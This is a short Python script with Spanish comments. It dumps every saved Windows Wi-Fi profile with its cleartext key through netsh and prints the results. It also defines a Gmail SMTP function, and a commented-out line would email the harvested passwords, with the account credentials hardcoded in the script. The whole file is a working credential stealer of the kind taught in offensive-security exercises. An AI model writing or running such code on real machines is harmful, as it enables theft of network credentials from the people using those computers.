#!/usr/bin/env python
import re
import subprocess, smtplib


def sendEmail(email, password, message):
    #crear una instancia de smtp server
    server = smtplib.SMTP('smtp.gmail.com', 587)
    #iniciar conexion TLS
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


comand = "netsh wlan show profile"
networks = subprocess.check_output(comand, shell=True, text=True)
network_names_list = re.findall(r'(?:Profile\s*:\s)(.*)', networks)

result = ''
for network_name in network_names_list:
	command = 'netsh wlan show profile '+ network_name +' key=clear'
	current_result = subprocess.check_output(command, shell=True, text=True)
	result= result + current_result

print(result)

#enviar por correo las respuestas
#sendEmail('walejandro1996@gmail.com', 'abc123abc123', result)

